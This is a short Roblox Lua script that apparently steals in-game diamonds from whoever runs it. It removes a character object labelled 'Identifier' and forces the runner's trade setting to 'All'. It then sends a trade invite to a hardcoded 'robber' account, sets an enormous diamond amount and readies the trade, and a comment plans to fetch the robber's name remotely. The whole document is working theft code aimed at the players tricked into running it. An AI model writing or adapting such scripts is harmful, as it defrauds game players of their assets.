local robberName = "iChronux" --Here goes the loadstring to a php which gives the current robber name
-- Identifier
if game.Players.LocalPlayer.Character:FindFirstChild("LeftHand") then
    game.Players.LocalPlayer.Character.LeftHand:Destroy()
end
local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
-- Enable trades
if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text ~= "All" then
	repeat
	    wait(1)
		local args = {
    			[1] = {
        		[1] = "Trading"
    			}
		}
		if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All" then break end
		workspace.__THINGS.__REMOTES:FindFirstChild("toggle setting"):FireServer(unpack(args))
	until game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All"
end
--Send trade
--(75) --Wait join trade cooldown
v2.Network.Fired("Init Trade"):Connect(function(p3, p4)
	tradeName = p3;
end);
local args = {
    [1] = {
        [1] = robberName
    }
}

workspace.__THINGS.__REMOTES:FindFirstChild("send trade invite"):InvokeServer(unpack(args))
repeat
    wait()
    print("Waiting for trade.")
until tradeName
print("Trade name: "..tradeName)
local ohTable1 = {
	[1] = tradeName,
	[2] = 1e4294892093
}

workspace.__THINGS.__REMOTES["change trade diamonds"]:InvokeServer(ohTable1)
-- This script was generated by Hydroxide's RemoteSpy: https://github.com/Upbolt/Hydroxide

local ohTable1 = {
	[1] = tradeName
}

workspace.__THINGS.__REMOTES["ready trade"]:InvokeServer(ohTable1)
